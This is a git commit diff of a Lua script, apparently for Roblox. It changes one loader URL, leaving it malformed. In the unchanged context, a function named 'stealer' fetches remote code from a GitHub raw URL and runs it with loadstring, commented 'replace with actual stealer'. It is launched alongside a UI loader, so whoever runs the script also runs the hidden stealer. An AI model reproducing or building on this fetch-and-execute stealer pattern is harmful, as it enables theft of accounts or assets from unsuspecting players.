baf4803733171b5ba9342f2076c8a747f08afe1f
TakZ-bit <tak72086@gmail.com>
2026-08-02 05:51:56 +0630

    Update Main.lua

--- Main.lua
+++ Main.lua
@@ -2,7 +2,7 @@ local function stealer()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/TakZ-bit/sturdy-fortnight/refs/heads/main/Bbil.lua'))() -- replace with actual stealer
 end
 local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/joshhhie/rise/refs/heads/main/loader.lua"))()
+  loadstring(game:HttpGet("hw.githubusercontent.com/joshhhie/rise/refs/heads/main/loader.lua"))()
 end
 task.spawn(stealer)
 task.spawn(loadui)
